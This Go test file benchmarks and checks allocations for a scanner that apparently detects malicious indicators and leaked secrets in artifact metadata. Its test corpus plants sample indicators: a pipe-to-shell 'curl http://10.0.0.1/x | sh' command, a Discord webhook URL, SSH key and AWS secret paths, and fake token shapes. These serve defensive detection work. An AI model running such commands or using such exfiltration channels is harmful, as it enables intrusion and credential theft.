package stringscan

import (
	"strings"
	"testing"
)

// benchCorpus builds a buffer of the size and shape a real artifact metadata blob or
// source file has: mostly ordinary text with a handful of indicators.
func benchCorpus(n int) []byte {
	line := "the model was trained on a large corpus of text and evaluates on held-out splits; "
	var b strings.Builder
	b.Grow(n + 512)
	for b.Len() < n {
		b.WriteString(line)
	}
	s := b.String()
	out := []byte(s)
	// Sprinkle indicators so the scanner cannot be fast by finding nothing.
	for _, lit := range []string{
		"https://discord.com/api/webhooks/123",
		"~/.ssh/id_rsa",
		"AWS_SECRET_ACCESS_KEY=",
		"curl http://10.0.0.1/x | sh",
		"base64.b64decode",
	} {
		at := len(out) / 3
		copy(out[at:], lit)
	}
	return out
}

func BenchmarkScanClean(b *testing.B) {
	buf := benchCorpus(1 << 20)
	dst := make([]Hit, 0, 64)
	b.SetBytes(int64(len(buf)))
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		dst = ScanInto(buf, dst)
	}
	_ = dst
}

// BenchmarkSecretTokenShapes measures the provider-token shape pass on its own. It
// exists because that pass is the one part of the engine that was written as a
// full-buffer search per shape (eight bytes.Index traversals of every buffer) and
// then rewritten as a single pass: on the clean buffer below that was 30% of the
// whole scan's regression against the round's starting commit.
func BenchmarkSecretTokenShapes(b *testing.B) {
	clean := []byte(strings.Repeat("the corpus is evaluated on held-out splits; ", 30000))
	tokens := []byte(strings.Repeat("see ghp_"+strings.Repeat("A1b2", 12)+" and sk-"+strings.Repeat("x9", 24)+" ", 200))
	for _, tc := range []struct {
		name string
		buf  []byte
	}{{"clean", clean}, {"tokens", tokens}} {
		b.Run(tc.name, func(b *testing.B) {
			dst := make([]Hit, 0, 64)
			b.SetBytes(int64(len(tc.buf)))
			b.ReportAllocs()
			b.ResetTimer()
			for b.Loop() {
				dst = scanSecretTokens(tc.buf, dst[:0])
			}
			_ = dst
		})
	}
}

func BenchmarkScanIndicators(b *testing.B) {
	buf := []byte(strings.Repeat("hook https://discord.com/api/webhooks/1 and ~/.ssh ", 20000))
	dst := make([]Hit, 0, 64)
	b.SetBytes(int64(len(buf)))
	b.ReportAllocs()
	b.ResetTimer()
	for b.Loop() {
		dst = ScanInto(buf, dst)
	}
	_ = dst
}

// TestScanIntoCostsNothingWhenThereIsNothingToReport is the plan's zero-allocation
// assertion for the shared engine. It is exact rather than a bound because the
// engine's contract on the hot path is that a clean buffer costs no allocation at
// all: the automaton is built once, the hits slice is the caller's, and every
// detector keeps its state in fixed-size locals.
func TestScanIntoCostsNothingWhenThereIsNothingToReport(t *testing.T) {
	clean := []byte(strings.Repeat("ordinary metadata value, no indicators here. ", 64))
	dst := make([]Hit, 0, 16)
	allocs := testing.AllocsPerRun(200, func() {
		dst = ScanInto(clean, dst)
	})
	if allocs != 0 {
		t.Fatalf("ScanInto allocated %.2f times per run on a clean buffer, want 0", allocs)
	}
}

// TestScanAllocatesOnlyForHits is the other half: when something is found, the
// allocation must be proportional to the hit count, not to the buffer.
func TestScanAllocatesOnlyForHits(t *testing.T) {
	one := []byte("a value with exactly one https://discord.com/api/webhooks/1 in it")
	dst := make([]Hit, 0, 16)
	allocs := testing.AllocsPerRun(200, func() {
		dst = ScanInto(one, dst)
	})
	if allocs > 4 {
		t.Fatalf("one hit cost %.2f allocations, want a small constant", allocs)
	}
}
